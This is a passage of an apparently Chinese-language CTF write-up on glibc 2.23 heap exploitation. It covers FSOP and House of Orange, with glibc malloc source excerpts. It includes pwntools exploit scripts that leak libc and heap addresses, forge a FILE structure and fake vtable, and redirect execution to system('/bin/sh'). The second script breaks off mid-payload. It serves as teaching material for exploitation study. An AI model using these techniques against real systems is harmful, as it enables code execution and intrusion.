    <span class="n">pause</span><span class="p">()</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./magicalloc"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'/home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"your choice:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"size:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"your choice:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'2'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Index:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"your choice:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'3'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"index:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"size:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"data:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"your choice:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'4'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"index:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">exit</span><span class="p">():</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"your choice:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'5'</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"name:"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1"># 0
</span><span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span>
<span class="n">heap_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x10</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'heap addr ===&gt; 0x{:x}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">))</span>

<span class="n">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1">#1
</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1">#2
</span><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x80</span><span class="o">+</span><span class="mh">0x10</span><span class="p">,</span> <span class="s">'a'</span><span class="o">*</span><span class="mh">0x90</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x90</span><span class="p">)</span>
<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3c4b78</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'libc addr ===&gt; 0x{:x}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">))</span>
<span class="n">system_off</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">system_off</span>


<span class="n">io_list_all_off</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_IO_list_all'</span><span class="p">]</span>
<span class="n">io_list_all_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">io_list_all_off</span>
<span class="n">fake_vtable</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x300</span>
<span class="n">p</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mh">0x80</span> <span class="c1"># padding to unsorted bin chunk
</span><span class="n">p</span> <span class="o">+=</span> <span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="c1"># fake file structure, to smallbin[4], _chain
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># fd
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">io_list_all_addr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="c1"># bk, unsorted bin attack
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_write_base
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># _IO_write_ptr
</span><span class="n">p</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="p">(</span><span class="mh">0xd8</span><span class="o">-</span><span class="mh">0x30</span><span class="p">)</span> <span class="c1"># padding to vtable
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_vtable</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x300</span><span class="o">-</span><span class="mh">0x10</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># padding to fake_vtable
</span><span class="n">p</span> <span class="o">+=</span> <span class="s">'b'</span><span class="o">*</span><span class="mh">0x18</span> <span class="c1"># padding to vtable-&gt;_overflow
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="n">p</span><span class="p">)</span>

<span class="c1"># debug("b *_IO_flush_all_lockp")
</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x300</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><h2 id="0x04-house-of-orange-glibc-223">0x04 house of orange (glibc 2.23)<a href="#0x04-house-of-orange-glibc-223" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><blockquote><p>File List:</p><ul><li><a href="/assets/file/houseoforange_22785bece84189e632567da38e4be0e0c4bb1682">house_of_orange</a><li><a href="/assets/file/libc.so.63751">libc.so</a></ul></blockquote><p>过于经典的题目，网上writeup也很多了</p><ul><li>https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html<li>https://veritas501.github.io/2017<em>12_13-IO_FILE</em>%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</ul><p>程序功能非常简单，漏洞点也很明显。edit的时候越界写，read没有添加NULL，可以做信息泄露。</p><p>程序非常特殊的点是没有<strong>free</strong>功能</p><p>该题要点：</p><ul><li>通过glibc malloc的机制获取free功能<li>通过越界写，利用unsorted bin来leak libc和heap<li>通过越界写，实现FSOP（这里利用手法基本和<strong>0x03 FSOP入门</strong>一模一样，所以不赘述了）</ul><p><strong>关于第一点，如何通过glibc malloc机制获取free功能：</strong></p><p>malloc时，如果fastbin, unsorted bin, smallbin, large bin, top chunk都不能满足要求时，就会使用<code class="language-plaintext highlighter-rouge">sysmalloc</code>来malloc。对应了我画的malloc workflow中这种特殊情况。<em>sysmalloc还没画。找个时间把它画完， 也由于这部分流程没画，所以这里就具体讲一下</em></p><p><img data-src="/assets/img/2022/image-20221209001313083.png" alt="image-20221209001313083" data-proofer-ignore></p><p>而<code class="language-plaintext highlighter-rouge">sysmalloc</code>中有一条路径，会触发<code class="language-plaintext highlighter-rouge">_int_free</code>，free掉top chunk，使得top chunk进入到unsorted bin。</p><p>上<a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L2268">源码</a>：</p><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>  <span class="cm">/*
     If have mmap, and the request size meets the mmap threshold, and
     the system supports mmap, and there are few enough currently
     allocated mmapped regions, try to directly map this request
     rather than expanding top.
   */</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">==</span> <span class="nb">NULL</span>
      <span class="o">||</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">mp_</span><span class="p">.</span><span class="n">mmap_threshold</span><span class="p">)</span>
	  <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">mp_</span><span class="p">.</span><span class="n">n_mmaps</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">n_mmaps_max</span><span class="p">)))</span>
    <span class="p">{</span>
      <span class="kt">char</span> <span class="o">*</span><span class="n">mm</span><span class="p">;</span>           <span class="cm">/* return value from mmap call*/</span>
	  <span class="p">.....</span>
      <span class="c1">//这里是mmap分析        </span>
</pre></table></code></div></div><blockquote><p>这个分支是通过<code class="language-plaintext highlighter-rouge">mmap </code>来malloc，不会触发<code class="language-plaintext highlighter-rouge">_int_free</code>，所以不可以满足这个if条件，</p><p>而另一个分支是通过<code class="language-plaintext highlighter-rouge">brk</code> 来malloc，会触发<code class="language-plaintext highlighter-rouge">_int_free</code></p><p>这个if判断的是申请的大小 是否 大于mmap_threshold，也就是申请的size是否大于等于0x20000</p><p>显然我们申请的size应该要小于0x20000</p></blockquote><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>  <span class="n">old_top</span> <span class="o">=</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">;</span>
  <span class="n">old_size</span> <span class="o">=</span> <span class="n">chunksize</span> <span class="p">(</span><span class="n">old_top</span><span class="p">);</span>
  <span class="n">old_end</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">chunk_at_offset</span> <span class="p">(</span><span class="n">old_top</span><span class="p">,</span> <span class="n">old_size</span><span class="p">));</span>
  
  <span class="n">brk</span> <span class="o">=</span> <span class="n">snd_brk</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">MORECORE_FAILURE</span><span class="p">);</span>

  <span class="cm">/*
     If not the first time through, we require old_size to be
     at least MINSIZE and to have prev_inuse set.
   */</span>

  <span class="c1">// bypass掉这个check</span>
  <span class="n">assert</span> <span class="p">((</span><span class="n">old_top</span> <span class="o">==</span> <span class="n">initial_top</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">old_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span>
          <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">old_size</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">MINSIZE</span> <span class="o">&amp;&amp;</span>
           <span class="n">prev_inuse</span> <span class="p">(</span><span class="n">old_top</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
           <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">old_end</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">pagesize</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">));</span>

  <span class="cm">/* Precondition: not enough current space to satisfy nb request */</span>
  <span class="n">assert</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">old_size</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span> <span class="o">+</span> <span class="n">MINSIZE</span><span class="p">));</span>
</pre></table></code></div></div><blockquote><p>走brk分支，需要bypass这个check，top chunk需要满足条件：</p><ol><li>大于MINSIZE(0x10)<li>小于申请的size + MINSIZE(0x10)<li>prev inuse位是1<li>&amp;old_top+old_size对齐到内存页， 也就是(&amp;old_top+old_size) &amp; 0xfff == 0</ol></blockquote><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>
<span class="cm">/* If possible, release the rest. */</span>
<span class="k">if</span> <span class="p">(</span><span class="n">old_size</span> <span class="o">&gt;=</span> <span class="n">MINSIZE</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">_int_free</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">old_top</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
<span class="err">}</span>
</pre></table></code></div></div><blockquote><p>brk一顿操作之后，会调用<code class="language-plaintext highlighter-rouge">_int_free</code>把原先的top chunk free掉</p></blockquote><p><strong>关于第二点，如何leak libc和heap</strong></p><p>假设目前unsorted bin中已经有chunkA了，<code class="language-plaintext highlighter-rouge">unsorted bin -&gt; chunkA </code></p><p>这时malloc一个chunk，size是large bin大小的，但又小于chunkA的size。此时glibc处理unsorted bin时，会将chunkA放入到large bin中，因为申请的size又小于这个large bin，所以会再从large bin中取出来，切割一下，剩余的再放回到unsorted bin中。这样一来一回，申请来的chunk就带回来large bin的fd/bk, fd_nextsize/bk_nextsize。因为fp/bk是unsorted bin中遗传来的，记录了main_arena的地址（获取了libc地址），fd_nextsize/bk_nextsize指向了heap段（获取了heap地址）</p><p><strong>所以该题思路：</strong></p><ul><li><p>通过溢出修改top_chunk size，从而触发<code class="language-plaintext highlighter-rouge">sysmalloc</code>中的<code class="language-plaintext highlighter-rouge">_int_free</code>， 获取到unsorted bin</p><li>通过unsorted bin布置堆，leak heap和libc<li>再利用溢出，达成FSOP，拿到shell</ul><p>其实思路还是比较简单的，只能说在当时（2016年）这个知识点比较新，在那时确实是有点难的。</p><p>最终该题内存布局为：</p><p><img data-src="/assets/img/2022/image-20221210200539322.png" alt="image-20221210200539322" data-proofer-ignore></p><p>exp：</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python2
# -*- coding: utf-8 -*-
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'split'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
    <span class="n">pause</span><span class="p">()</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./houseoforange"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'/home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">build</span><span class="p">(</span><span class="n">name_length</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">price</span><span class="o">=</span><span class="mi">12</span><span class="p">,</span> <span class="n">color</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Length of name :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">name_length</span><span class="p">))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Name :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Price of Orange:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Color of Orange:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">color</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'2'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">name_length</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">price</span><span class="o">=</span><span class="mi">12</span><span class="p">,</span> <span class="n">color</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'3'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Length of name :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">name_length</span><span class="p">))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Name:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Price of Orange:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Color of Orange:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">color</span><span class="p">))</span>

<span class="n">build</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="s">'a'</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mh">0x40</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xf91</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="n">p</span><span class="p">)</span>
<span class="n">build</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="s">'b'</span><span class="p">)</span> <span class="c1"># 最大就0x1000
</span><span class="n">build</span><span class="p">(</span><span class="mh">0x400</span><span class="p">,</span> <span class="s">'c'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">show</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"c"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3c5188</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'libc addr ===&gt; 0x{:x}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">))</span>
<span class="n">edit</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s">'c'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">show</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"c"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">heap_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'heap addr ===&gt; 0x{:x}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">))</span>

<span class="n">io_list_all_off</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_IO_list_all'</span><span class="p">]</span>
<span class="n">io_list_all_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">io_list_all_off</span>
<span class="n">fake_vtable</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x600</span>
<span class="n">system_off</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">system_off</span>
<span class="n">p</span> <span class="o">=</span> <span class="s">'c'</span><span class="o">*</span><span class="mh">0x420</span> <span class="c1"># padding to unsorted bin chunk
</span><span class="n">p</span> <span class="o">+=</span> <span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="c1"># fake file structure, to smallbin[4], _chain
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># fd
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">io_list_all_addr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="c1"># bk, unsorted bin attack
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_write_base
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># _IO_write_ptr
</span><span class="n">p</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0xa8</span> <span class="c1"># padding to vtable
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_vtable</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x600</span><span class="o">-</span><span class="mh">0x10</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># padding to fake_vtable
